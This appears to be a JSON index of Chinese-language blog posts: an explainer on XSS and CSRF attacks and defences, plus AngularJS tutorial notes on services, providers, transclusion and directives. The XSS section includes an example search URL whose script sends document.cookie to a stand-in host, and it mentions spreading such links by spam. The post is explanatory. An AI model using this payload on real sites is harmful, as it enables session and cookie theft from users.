地址随机化","categories":[{"name":"mixed","slug":"mixed","permalink":"https://github.com/xmoyKING/categories/mixed/"}],"tags":[{"name":"security","slug":"security","permalink":"https://github.com/xmoyKING/tags/security/"},{"name":"C","slug":"C","permalink":"https://github.com/xmoyKING/tags/C/"},{"name":"assembly","slug":"assembly","permalink":"https://github.com/xmoyKING/tags/assembly/"}]},{"title":"了解XSS/CSRF","slug":"xss-csrf","date":"2017-06-06T05:21:15.000Z","updated":"2017-06-06T05:21:15.000Z","comments":true,"path":"2017/06/06/xss-csrf/","link":"","permalink":"https://github.com/xmoyKING/2017/06/06/xss-csrf/","excerpt":"","text":"XSS攻击和防御XSS定义跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的特殊目的。 XSS攻击方式反射型发出请求时，XSS代码出现在URL中（典型的特征：攻击脚本写在URL中，是明文的），作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器（解析了XS代码，服务端把内容与HTML文本下发给浏览器，通常是js脚本），最后浏览器解析执行XSS代码这个过程像一次反射，故叫反射型XSS，也叫作”非持久型XSS“(Non-persistent XSS) 做个假设，当亚马逊在搜索书籍，搜不到书的时候显示提交的名称。 在搜索框搜索内容，填入“alert(‘handsome boy’)”, 点击搜索。 当前端页面没有对返回的数据进行过滤，直接显示在页面上， 这时就会alert那个字符串出来。 进而可以构造获取用户cookies的地址，通过QQ群或者垃圾邮件，来让其他人点击这个地址：http://www.amazon.cn/search?name=document.location=’http://xxx/get?cookie=’+document.cookie 存储型把用户输入的数据”存储“在服务器端。这种XSS具有很强的稳定性。比较常见的一个场景：黑客写下一篇包含恶意Javascript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的Javascript代码。黑客把恶意的脚本保存在服务器端，所以中XSS攻击就叫做”存储型XSS”。 DOM based XSS也是一种反射型XSS，由于历史原因被单独列出来了。通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS XSS的危害这些危害包括但不局限于：盗取管理员或普通用户cookie、session；读取、篡改、添加、删除敏感数据;网站挂马；非法转账；控制受害者机器向其它网站发起攻击 等等 XSS防御措施 编码：不能对用户所有输入保持原样对用户输入的数据写入HTML文档HTML实体编码规则避免直接对HTML Entity解码使用DOM Parse转换，校正不匹配对的DOM标签 过滤：把输入不合法的过滤掉，保持安全性移除用户上传的DOM属性，如onerror，onclick等移除用户上传的Style节点，script节点，iframe节点等在表单提交或者url参数传递前，对需要的参数进行过滤,XSS过滤工具类代码过滤用户输入的 检查用户输入的内容中是否有非法内容。如&lt;&gt;（尖括号）、”（引号）、 ‘（单引号）、%（百分比符号）、;（分号）、()（括号）、&amp;（&amp; 符号）、+（加号）等。、严格控制输出 CSRF攻击和防御参考链接：CSRF 详解与攻防实战 CSRF是什么呢？CSRF全名是Cross-site request forgery，是一种对网站的恶意利用，CSRF比XSS更具危险性。想要深入理解CSRF的攻击特性我们有必要了解一下网站session的工作原理。 http请求是无状态的，也就是说每次http请求都是独立的无关之前的操作的，但是每次http请求都会将本域下的所有cookie作为http请求头的一部分发送给服务端，所以服务端就根据请求中的cookie存放的sessionid去session对象中找到该用户资料了。 CSRF攻击的主要目的是让用户在不知情的情况下攻击自己已登录的一个系统，类似于钓鱼。如用户当前已经登录了邮箱，或bbs，同时用户又在使用另外一个，已经被你控制的站点，我们姑且叫它钓鱼网站。这个网站上面可能因为某个图片吸引你，你去点击一下，此时可能就会触发一个js的点击事件，构造一个bbs发帖的请求，去往你的bbs发帖，由于当前你的浏览器状态已经是登陆状态，所以session登陆cookie信息都会跟正常的请求一样，纯天然的利用当前的登陆状态，让用户在不知情的情况下，帮你发帖或干其他事情。 CSRF防御通过 referer、token 或者 验证码 来检测用户提交。尽量不要在页面的链接中暴露用户隐私信息。对于用户修改删除等操作最好都使用post操作 。避免全站通用的cookie，严格设置cookie的域。","categories":[{"name":"mixed","slug":"mixed","permalink":"https://github.com/xmoyKING/categories/mixed/"}],"tags":[{"name":"security","slug":"security","permalink":"https://github.com/xmoyKING/tags/security/"},{"name":"xss","slug":"xss","permalink":"https://github.com/xmoyKING/tags/xss/"},{"name":"csrf","slug":"csrf","permalink":"https://github.com/xmoyKING/tags/csrf/"}]},{"title":"angularjs入门笔记-19-模块与服务协作","slug":"angularjs19","date":"2017-06-02T07:20:19.000Z","updated":"2017-12-06T14:50:08.883Z","comments":true,"path":"2017/06/02/angularjs19/","link":"","permalink":"https://github.com/xmoyKING/2017/06/02/angularjs19/","excerpt":"","text":"模块和服务在ng中到底扮演着什么角色，应该如何使用，而这两者又有什么联系？ 扩展已存在的模块或创建新模块将应用分为多个文件 使用Module.factory创建服务来定义对象 使用Module.service创建服务定义构造器，通过提供器创建可配置的服务 模块在ng中有两个角色，一是使用ng-app指令定义应用于HTML元素中的应用的功能，定义模块是ng开发的起点。第二是使用模块定义功能，比如服务，指令和过滤器，使之在不同的应用中某种成都上易于重用，即能跨多个应用使用。 服务用于在应用中封装需要重用的功能，这不完全适合MVC模式。服务通过实现横切关注点（cross-cutting-concerns），这对于影响多个组件或多个组件影响的所有功能的统称。比如典型的有日志、安全、联网，它们不是模块的一部分，不属于控制器，因为在模块中没有影响用户交互或执行操作，他们也不是视图或指令的一部分，因为它们不能为用户呈现模型，总之，若不使用其他方法创建新功能，就使用服务吧。横切关注点指的是一些具有横越多个模块的行为，传统的开发方法不能有效的模块话这种行为 ###模块在实际项目中，代码和标签并不是仅在单个HTML文件中，那样会使应用变得笨拙，同时难以多人协同开发，解决的方案是分离应用的组件到单个文件中，并使用script元素在主html文件中引用那些文件。同时，使用统一的方式命名并组织文件可以让项目更合理，一般按类型将组件分类（比如控制器是一类，指令是一类）或（用户管理组件一类，内容管理组件是一类）123456789101112131415// directives.js angular.module(\"customDirectives\", [\"customServices\"]) .directive(\"triButton\", function (logService) &#123; return &#123; scope: &#123; counter: \"=counter\" &#125;, link: function (scope, element, attrs) &#123; element.on(\"click\", function (event) &#123; logService.log(\"Button click: \" + event.target.innerText); scope.$apply(function () &#123; scope.counter++; &#125;); &#125;); &#125; &#125; &#125;); 注意在创建指令时声明了对customServices模块的依赖，同时在工厂函数中参数指定了对logService的服务的依赖，使用将在后面看到。 ###服务ng中有三个方法定义服务，factory、service和provider，这些方法的效果是一样的（即能创建在整个ng应用中提供功能的服务对象），但是每个方法的创建和管理服务对象的方式不一样。 ####factory创建服务最简单的方法是使用Module.factory方法，传入服务名称和factory函数作为参数，返回服务对象。12345678910// services.jsangular.module(\"customServices\", []) .factory(\"logService\", function () &#123; var messageCount = 0; return &#123; log: function (msg) &#123; console.log(\"(LOG + \" + messageCount++ + \") \" + msg); &#125; &#125;; &#125;); 上述代码创建了一个新模块customServices并调用factory方法创建了服务logService，在工厂函数中定义log函数对象，它接收消息作为参数写入控制台。通过工厂函数返回的对象就是服务对象，且每当logService被请求，该服务对象都将被ng调用。工厂函数仅被调用一次，因为该对象创建和返回时使用的服务在应用中是必不可少的。常见错误是假定服务的每个调用者都接到不同的服务对象，并且认为计数器变量会每次调用重新计算，同时需要注意重复使用服务名称会覆盖同名服务。 1234567891011121314151617181920212223242526272829303132333435&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Services and Modules&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;script src=\"directives.js\"&gt;&lt;/script&gt; &lt;script src=\"services.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", [\"customDirectives\", \"customServices\"]) .controller(\"defaultCtrl\", function ($scope, logService) &#123; $scope.data = &#123; cities: [\"London\", \"New York\", \"Paris\"], totalClicks: 0 &#125;; $scope.$watch('data.totalClicks', function (newVal) &#123; logService.log(\"Total click count: \" + newVal); &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"well\"&gt; &lt;div class=\"btn-group\" tri-button counter=\"data.totalClicks\" source=\"data.cities\"&gt; &lt;button class=\"btn btn-default\" ng-repeat=\"city in data.cities\"&gt; &#123;&#123;city&#125;&#125; &lt;/button&gt; &lt;/div&gt; &lt;h5&gt;Total Clicks: &#123;&#123;data.totalClicks&#125;&#125;&lt;/h5&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 使用logService服务比直接在代码中写console.log()的好处有如下几点： 可以在service.js中注释一行以达到对整个应用的修改 服务调用者无需深究其实现，即可以彻底改变日志记录被执行的方式而无需对服务对象以外做任何改变 可以从应用中隔离并单独测试服务的功能 服务能构建通用功能而无需打破MVC模式 ####Service当ng需要满足由factory方法定义的服务的依赖关系时，使用工程函数返回对象很简单，但若需要ng使用工厂函数返回的对象用new关键字（如构造器一样）来创建服务对象呢？则需要service方法定义服务。如下service方法完成如factory一样的工作，并扩展了一个errorService服务：123456789101112131415161718var baseLogger = function () &#123; this.messageCount = 0; this.log = function (msg) &#123; console.log(this.msgType + \": \" + (this.messageCount++) + \" \" + msg); &#125;&#125;;var debugLogger = function () &#123; &#125;;debugLogger.prototype = new baseLogger();debugLogger.prototype.msgType = \"Debug\";var errorLogger = function () &#123; &#125;;errorLogger.prototype = new baseLogger();errorLogger.prototype.msgType = \"Error\";angular.module(\"customServices\", []) .service(\"logService\", debugLogger) .service(\"errorService\", errorLogger); 首先做的是创建构造函数baseLogger，实际上是为了定义了一个基类，debugLogger继承自baseLogger,同时设置msgType为Debug. new关键字创建新的对象并将属性和由构造函数所定义的函数复制到新对象中。使用构造器的目的是，在基类中定义功能，然后将它派生出多种不同的子类。上面的service方法除了接收一个字符串作为服务名，第二个参数为一个构造器。 service中不是一定要显式使用原型的，如下也可以达到目的：123456789angular.module(\"customServices\", []) .service(\"logService\", function () &#123; return &#123; messageCount: 0, log: function (msg) &#123; console.log(\"Debug: \" + (this.messageCount++) + \" \" + msg); &#125; &#125;; &#125;); 但ng仍然会在背后使用new创建这个服务对象，所以推荐使用原型。 ####ProviderProvider可以看作是提供了更“底层”的方法创建服务，即通过配置的方法能更多的控制被创建的服务对象。12345678910111213angular.module(\"customServices\", []) .provider(\"logService\", function() &#123; return &#123; $get: function () &#123; return &#123; messageCount: 0, log: function (msg) &#123; console.log(\"(LOG + \" + this.messageCount++ + \") \" + msg); &#125; &#125;; &#125; &#125; &#125;); provider方法的参数是服务名和工厂函数，而这个工厂函数必须返回一个对象，被成为provider对象（与provider方法不同）,并且该对象必须有一个$get方法，该方法返回真正的服务对象。当需要该服务时，ng将调用factory方法去获得这个provider对象，然后调用$get方法获取服务对象。 使用provider方法并不会改变服务的使用方法，但是使用provider方法的优点是可以为provider方法添加功能，用于配置服务对象，如下：1234567891011121314151617181920212223242526272829303132333435angular.module(\"customServices\", []) .provider(\"logService\", function () &#123; var counter = true; var debug = true; return &#123; messageCounterEnabled: function (setting) &#123; if (angular.isDefined(setting)) &#123; counter = setting; return this; &#125; else &#123; return counter; &#125; &#125;, debugEnabled: function(setting) &#123; if (angular.isDefined(setting)) &#123; debug = setting; return this; &#125; else &#123; return debug; &#125; &#125;, $get: function () &#123; return &#123; messageCount: 0, log: function (msg) &#123; if (debug) &#123; console.log(\"(LOG\" + (counter ? \" + \" + this.messageCount++ + \") \" : \") \") + msg); &#125; &#125; &#125;; &#125; &#125; &#125;); 上面在provider对象中添加了2个函数，一个用以控制是否启用计算器，另一个用以控制是否启用日志功能。注意，一般这些配置函数会检查参数，当提供参数时则表示设置，而没有参数时则表示查询，同时为了使多个配置函数可链式调用，设置参数时返回provider对象作为结果。 ng中provider对象也适用于依赖注入，获得和使用provider对象的一般方法是传入Module.config方法的函数参数列表中，声明对这些provider对象的依赖，以服务名Provider的形式注入依赖（为了与普通的服务做区分）。1234angular.module(\"exampleApp\", [\"customDirectives\", \"customServices\"]).config(function (logServiceProvider) &#123; logServiceProvider.debugEnabled(true).messageCounterEnabled(false);&#125;) 用config方法配置服务不是必须的，但是最好这样做，因为服务对象都是单例的，一旦对其做出改变，所有组件都受影响，所以最好统一配置。 内置模块和服务ng内置了非常非常多的模块和服务，所以绝大多数情况下，我们需要做的是合理使用并组合这些内置功能即可（按字母排序）。 $anchorScroll 滚动浏览器窗口至指定锚点 $animate 使用动画 $compile 处理一个HTML片段以创建可被用于生成内容的函数 $controller 封装$injector服务封装的实例化控制器 $document 提供jqLite对象 $exceptionHandler 处理异常 $filter 提供过滤器入口 $http 创建并管理ajax请求 $injector 创建ng组件实例 $interpolate 处理字符串，包括绑定表达式创建可被用于生成内容的函数 $interval 对浏览器标准setInterval的增强封装 $location 对浏览器标准location对象的封装 $log 对浏览器console对象的封装 $parse 处理表达式并创建可用于生成内容的函数 $provide 许多Module暴露方法的实现 $q 提供deferred对象/promises $resource 对他RESTfulAPI运作的支持 $rootElement DOM根元素 $rootScope 顶级作用域 $route 基于URL的视图更新功能 $routeParams URL路由信息 $sanitize 将HTML中部分不安全字符转码 $sce 过滤HTML字符串中危险的元素和属性 $swipe 识别单击手势 $timeout 对浏览器标准setTimeout的增强封装 $window 浏览器window对象","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs入门笔记-18-自定义指令2","slug":"angularjs18","date":"2017-05-28T02:17:34.000Z","updated":"2017-12-06T14:50:08.883Z","comments":true,"path":"2017/05/28/angularjs18/","link":"","permalink":"https://github.com/xmoyKING/2017/05/28/angularjs18/","excerpt":"","text":"除了在上一节已经介绍的自定义指令特性之外，还有一些其他特性。 $render方法， 处理外部数据的变化 $setViewValue方法， 处理内部数据的变化 $formatters数组，格式化值 $parsers数组，$setValidity，校验值 嵌入包含潜入包含的意思是将一个文档的一部分通过引用插入到另一个文档中，在指令的上下文中，当需要创建一个自定义指令，而该指令模版内为外部控制器指定时，这就很有用了,使用ng-transclude达到这种目的。 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Transclusion&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script type=\"text/ng-template\" id=\"template\"&gt; &lt;div class=\"panel panel-default\"&gt; &lt;div class=\"panel-heading\"&gt; &lt;h4&gt;This is the panel&lt;/h4&gt; &lt;/div&gt; &lt;div class=\"panel-body\" ng-transclude&gt; &lt;/div&gt; &lt;/div&gt; &lt;/script&gt; &lt;script type=\"text/javascript\"&gt; angular.module(\"exampleApp\", []) .directive(\"panel\", function () &#123; return &#123; link: function (scope, element, attrs) &#123; scope.dataSource = \"directive\"; &#125;, restrict: \"E\", scope: true, template: function () &#123; return angular.element( document.querySelector(\"#template\")).html(); &#125;, transclude: true &#125; &#125;) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.dataSource = \"controller\"; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;panel&gt; The data value comes from the: &#123;&#123;dataSource&#125;&#125; &lt;/panel&gt;&lt;/body&gt;&lt;/html&gt; 可以看到，原本指令模版中带ng-transclude属性的标签的内部被替换为了外部defaultCtrl的panel内容，同时，dataSource绑定的值为控制器作用域内的值，而不是指令作用域内的值。 要使用嵌入包含，需要设置两个值，一个是自定义指令选项中设置transclude: true,然后是在指令模版中使用ng-transclude指定包含的位置。 当将scope设置为false时，dataSource将使用隔离作用域中的值，即directive 编译函数编译函数是当指令特别复杂或需要处理大量数据时，使用编译函数操作DOM并让链接函数执行其他任务，除了性能，使用编译函数可通过嵌入包含来重复生成内容。 一般情况下可以通过简化代码或者优化待处理数据的方法来解决性能问题。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Compile Function&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script type=\"text/javascript\"&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.products = [&#123; name: \"Apples\", price: 1.20 &#125;, &#123; name: \"Bananas\", price: 2.42 &#125;, &#123; name: \"Pears\", price: 2.02 &#125;]; $scope.changeData = function () &#123; $scope.products.push(&#123; name: \"Cherries\", price: 4.02 &#125;); for (var i = 0; i &lt; $scope.products.length; i++) &#123; $scope.products[i].price++; &#125; &#125; &#125;) .directive(\"simpleRepeater\", function () &#123; return &#123; scope: &#123; data: \"=source\", propName: \"@itemName\" &#125;, transclude: 'element', compile: function (element, attrs, transcludeFn) &#123; return function ($scope, $element, $attr) &#123; $scope.$watch(\"data.length\", function () &#123; var parent = $element.parent(); parent.children().remove(); for (var i = 0; i &lt; $scope.data.length; i++) &#123; var childScope = $scope.$new(); childScope[$scope.propName] = $scope.data[i]; transcludeFn(childScope, function (clone) &#123; parent.append(clone); &#125;); &#125; &#125;); &#125; &#125; &#125; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\" class=\"panel panel-body\" &gt; &lt;table class=\"table table-striped\"&gt; &lt;thead&gt;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Price&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt; &lt;tbody&gt; &lt;tr simple-repeater source=\"products\" item-name=\"item\"&gt; &lt;td&gt;&#123;&#123;item.name&#125;&#125;&lt;/td&gt;&lt;td&gt;&#123;&#123;item.price | currency&#125;&#125;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;button class=\"btn btn-default text\" ng-click=\"changeData()\"&gt;Change&lt;/button&gt;&lt;/body&gt;&lt;/html&gt; 上例即通过simpleRepeater指令实现了ng-repeat指令，但由于是自己实现的ng-repeat，对dom的操作较多，性能上远远比不上内置的ng-repeat指令。 See the Pen 编译函数 by XmoyKing (@xmoyking) on CodePen. transclude: &#39;element&#39;表示元素本身被包含于嵌入包含中，而不仅仅只是其内容。compile编译函数在执行时将会被传入三个参数，分别是指令所应用的元素，该元素的属性，以及一个可用于创建潜入包含元素的拷贝的函数。 编译函数的关键是，会返回一个链接函数（会忽略外部指定了link链接函数），因为编译函数的目的是修改DOM，所以返回一个链接函数是理所当然的，这样能更方便的将数据从指令的一部分传递到下一个部分。 由于编译函数仅仅操作DOM，所以参数中没有作用域对象，但返回的链接函数可以声明对$scope，$element, $attrs参数的依赖，分别对应到普通链接函数中的各个参数。 链接函数的作业是添加监听器和事件，所以上述例子对data.length属性使用$watch方法监听，当数据发生变化时需要响应更新其他绑定的数据： 先删除父元素内的所有子元素 遍历数据对象，使用$new方法创建新的作用域 对于每一个嵌入包含内容的实例，将克隆的数据传入并赋值到新作用域中的item属性 123transclude(childScope, function(clone)&#123; parent.append(clone);&#125;); 上述的函数调用非常重要，因为这个传给编译函数的嵌入包含函数执行时才是真正进行DOM操作的时候，函数参数分别为：包含item属性的子作用域，item属性设置为当前数据项，以及一个传日了嵌入包含内容的一组拷贝的函数，使用jqLite将这份拷贝添加到父元素行下。结果即对于每个数据对象生成了指令所应用到的tr元素的一份拷贝（及其内容），并且创建了一个新的作用域，在这个作用域中允许嵌入包含内容使用item来引用当前数据对象。 在指令中使用控制器指令能够创建出被其他指令所用的控制器，即允许组合不同的指令创建更复杂的组件。 下面的例子基于两个指令，指令productItem用于表格内，通过ng-repeat生成表格各行。productTable指令被用在table元素上并且使用嵌入包含,同时productTable指令能够提供一个被productItem指令所使用的函数，该函数能够用于标记输入框元素的值的变化情况。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Directive Controllers&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script type=\"text/ng-template\" id=\"productTemplate\"&gt; &lt;td&gt;&#123;&#123;item.name&#125;&#125;&lt;/td&gt; &lt;td&gt;&lt;input ng-model='item.quantity' /&gt;&lt;/td&gt; &lt;/script&gt; &lt;script type=\"text/ng-template\" id=\"resetTemplate\"&gt; &lt;td colspan=\"2\"&gt;&lt;button ng-click=\"reset()\"&gt;Reset&lt;/button&gt;&lt;/td&gt; &lt;/script&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.products = [&#123; name: \"Apples\", price: 1.20, quantity: 2 &#125;, &#123; name: \"Bananas\", price: 2.42, quantity: 3 &#125;, &#123; name: \"Pears\", price: 2.02, quantity: 1 &#125;]; &#125;) .directive(\"productItem\", function () &#123; return &#123; template: document.querySelector(\"#productTemplate\").outerText, require: \"^productTable\", link: function (scope, element, attrs, ctrl) &#123; scope.$watch(\"item.quantity\", function () &#123; ctrl.updateTotal(); &#125;); &#125; &#125; &#125;) .directive(\"productTable\", function () &#123; return &#123; transclude: true, scope: &#123; value: \"=productTable\", data: \"=productData\" &#125;, controller: function ($scope, $element, $attrs) &#123; this.updateTotal = function () &#123; var total = 0; for (var i = 0; i &lt; $scope.data.length; i++) &#123; total += Number($scope.data[i].quantity); &#125; $scope.value = total; &#125; &#125; &#125; &#125;) .directive(\"resetTotals\", function () &#123; return &#123; scope: &#123; data: \"=productData\", propname: \"@propertyName\" &#125;, template: document.querySelector(\"#resetTemplate\").outerText, require: \"^productTable\", link: function (scope, element, attrs, ctrl) &#123; scope.reset = function () &#123; for (var i = 0; i &lt; scope.data.length; i++) &#123; scope.data[i][scope.propname] = 0; &#125; ctrl.updateTotal(); &#125; &#125; &#125; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"panel panel-default\"&gt; &lt;div class=\"panel-body\"&gt; &lt;table class=\"table table-striped\" product-table=\"totalValue\" product-data=\"products\" ng-transclude&gt; &lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Quantity&lt;/th&gt;&lt;/tr&gt; &lt;tr ng-repeat=\"item in products\" product-item&gt;&lt;/tr&gt; &lt;tr&gt;&lt;th&gt;Total:&lt;/th&gt;&lt;td&gt;&#123;&#123;totalValue&#125;&#125;&lt;/td&gt;&lt;/tr&gt; &lt;tr reset-totals product-data=\"products\" property-name=\"quantity\"&gt;&lt;/tr&gt; &lt;/table&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 在productTable指令中，使用controller属性指定一个控制器，这个控制器在参数中声明对作用域$scope，元素$element, 元素属性$attrs的依赖，同时在其内定义了一个updateTotal的函数。 在productItem指令中，使用require属性指定对控制器的依赖，前缀^表示在指令所应用的元素的父元素上查找另一个指令，除了^前缀，还有?前缀和None值： ?前缀，表示若找不到指令则默认忽略 None值，表示两个指令应用于同一元素 为了使用控制器中定义的方法，在链接函数中指定一个参数ctrl（注意这里不是依赖注入的方式），然后就可以在本地的链接函数中调用其内的方法了ctrl.updateTotal() 在指令中定义控制器函数的目的是对功能进行分离和重用，从而无需对整个庞大的组件进行测试和再构建。productTable的控制器并不需要知道productItem控制器的实现和功能，即只要productTable控制器仍然提供updateTotal函数即可独立测试并任意修改。 如下演示中添加了reset按钮，将所有的数量清零，在一个隔离的作用域上提供数据数组和要清零的属性名称，该指令即可通过数据绑定查找要清零的位置，之后调用productTable的updateTotal方法。 See the Pen OjxKjG by XmoyKing (@xmoyking) on CodePen. 创建自定义表单元素ng-model指令能以多种方法捕获输入数据，允许我们定义组件时创建出特有的表单元素。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;CustomForms&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;style&gt; *.error &#123; color: red; font-weight: bold; &#125; &lt;/style&gt; &lt;script type=\"text/ng-template\" id=\"triTemplate\"&gt; &lt;div class=\"well\"&gt; &lt;div class=\"btn-group\"&gt; &lt;button class=\"btn btn-default\"&gt;Yes&lt;/button&gt; &lt;button class=\"btn btn-default\"&gt;No&lt;/button&gt; &lt;button class=\"btn btn-default\"&gt;Not Sure&lt;/button&gt; &lt;/div&gt; &lt;span class=\"error\" ng-show=\"myForm.decision.$error.confidence\"&gt; You need to be sure &lt;/span&gt; &lt;/div&gt; &lt;/script&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope) &#123; $scope.dataValue = \"Not Sure\"; &#125;) .directive(\"triButton\", function () &#123; return &#123; restrict: \"E\", replace: true, require: \"ngModel\", template: document.querySelector(\"#triTemplate\").outerText, link: function (scope, element, attrs, ctrl) &#123; var validateParser = function (value) &#123; var valid = (value == \"Yes\" || value == \"No\"); ctrl.$setValidity(\"confidence\", valid); return valid ? value : undefined; &#125; ctrl.$parsers.push(validateParser); element.on(\"click\", function (event) &#123; setSelected(event.target.innerText); scope.$apply(function () &#123; ctrl.$setViewValue(event.target.innerText); &#125;); &#125;); var setSelected = function (value) &#123; var buttons = element.find(\"button\"); buttons.removeClass(\"btn-primary\"); for (var i = 0; i &lt; buttons.length; i++) &#123; if (buttons.eq(i).text() == value) &#123; buttons.eq(i).addClass(\"btn-primary\"); &#125; &#125; &#125; ctrl.$render = function () &#123; validateParser(ctrl.$viewValue); &#125; &#125; &#125; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;form name=\"myForm\" novalidate&gt; &lt;div&gt;&lt;tri-button name=\"decision\" ng-model=\"dataValue\" /&gt;&lt;/div&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; See the Pen 自定义表单元素 by XmoyKing (@xmoyking) on CodePen. 当dataValue属性在指令外被修改时，能够改变显示的按钮状态，通过替换ngModel控制器所定义的$render函数，原来的函数调用setSelected函数，当值在指令外被修改并且需要更新内容时，$render方法会被ng-model指令调用，通过读取$viewValue属性可拿到最新的值。123ctrl.$render = function () &#123; setSelected(ctrl.$viewValue || \"Not Sure\");&#125; ngModel控制器提供了一些基本方法和属性： $render() 当数据绑定的值发生变化时ngModel控制器调用更新UI的函数，通常会用自定义控制器覆盖该函数。 $setViewValue(value) 更新数据绑定值 $viewValue 返回格式化后的值 $modelValue 从作用域返回未格式化的值 $formatters 将$modelValue转成$viewValue的格式化函数数组 当用户单击按钮时将变化通过ng-model指令传播到作用域123456element.on(\"click\", function (event) &#123; setSelected(event.target.innerText); scope.$apply(function () &#123; ctrl.$setViewValue(event.target.innerText); &#125;);&#125;); $setViewValue方法调用时，ngModel控制器不会自动调用$render方法，所以需要在click事件中显式调用setSelected。 表单还需要一个很重要的功能就是验证，在本例中定义了一个名为confidence的验证错误属性，同时定义了一个叫validateParser的函数用于解析数据绑定的值，验证值并返回结果，通过ctrl.$parser.push(validateParser)注册该解析器。 ngModel控制器提供的验证方法和属性： $setPristine() 将校验状态重置，同时会阻止继续校验 $isEmpty() 可设置指令表示该控件无值，默认实现为查找空字符串&#39;&#39;,null,undefined等值 $parsers 一个校验函数组成的数组 $error 返回一个对象，其各个属性对应各个校验错误信息 $pristine 若控件未修改，返回true $dirty $valid $invalid","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs入门笔记-20-针对错误、表达式、全局对象的服务","slug":"angularjs20","date":"2017-05-27T07:27:49.000Z","updated":"2017-12-06T14:50:08.883Z","comments":true,"path":"2017/05/27/angularjs20/","link":"","permalink":"https://github.com/xmoyKING/2017/05/27/angularjs20/","excerpt":"","text":"ng内置了对全局对象，处理异常，显示危险数据，处理表达式相关的服务。 DOM API全局对象服务ng内置的全局对象服务的目的是为了使测试变得简单，单元测试最重要的功能就是隔离一段代码并单独测试其行为而无需测试它所依赖的组件。浏览器中的DOM API通过全局对象提供接口，如document和window，但这种暴露全局对象的方式不适合单元测试，所以使用$document这样的服务能够不用DOM API时也能写ng代码。 $window服务$window服务使用简单，和原生的使用无差别，ng并没有增强或改变这个全局对象123456angular.module(\"exampleApp\", []).controller(\"defaultCtrl\", function ($scope, $window) &#123; $scope.displayAlert = function(msg) &#123; $window.alert(msg); &#125;&#125;); $document服务$document服务是一个包含原生DOM API的jqLite对象123456angular.module(\"exampleApp\", []).controller(\"defaultCtrl\", function ($scope, $window, $document) &#123; $document.find(\"button\").on(\"click\", function (event) &#123; $window.alert(event.target.innerText); &#125;);&#125;); $interval和$timeout服务$interval和$timeout服务包含了一些增强的功能 fn 定时执行的函数 delay fn被执行前的延迟事件 count $interval执行循环次数，默认0表示无限制 InvokeApply 默认为true，表示fn将和scope.$apply一同执行，123456angular.module(\"exampleApp\", []).controller(\"defaultCtrl\", function ($scope, $interval) &#123; $interval(function () &#123; $scope.time = new 